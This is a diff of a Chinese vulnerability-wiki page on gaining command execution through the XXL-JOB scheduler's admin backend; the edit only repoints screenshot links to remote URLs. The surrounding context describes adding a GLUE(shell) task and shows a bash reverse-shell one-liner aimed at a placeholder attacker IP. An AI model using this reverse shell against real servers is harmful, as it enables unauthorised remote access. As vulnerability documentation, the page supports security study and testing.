@@ -20,19 +20,19 @@ XXL-JOB 任务调度中心攻击者可以在后台可以通过写入shell命令�
 
 登录后台增加一个任务
 
-![](image/xxl-4.png)
+![](http://wikioss.peiqi.tech/vuln/xxl-4.png)
 
 > [!NOTE]
 >
 > 注意运行模式需要为 GLUE(shell)
 
-![](image/xxl-5.png)
+![](http://wikioss.peiqi.tech/vuln/xxl-5.png)
 
 点击 GLUE IDE编辑脚本
 
-![](image/xxl-6.png)
+![](http://wikioss.peiqi.tech/vuln/xxl-6.png)
 
-![](image/xxl-7.png)
+![](http://wikioss.peiqi.tech/vuln/xxl-7.png)
 
 执行探测出网，和任务调用是否可执行
 
@@ -43,4 +43,4 @@ XXL-JOB 任务调度中心攻击者可以在后台可以通过写入shell命令�
 bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 <&1'
 ```
 
-![](image/xxl-8.png)
+![](http://wikioss.peiqi.tech/vuln/xxl-8.png)
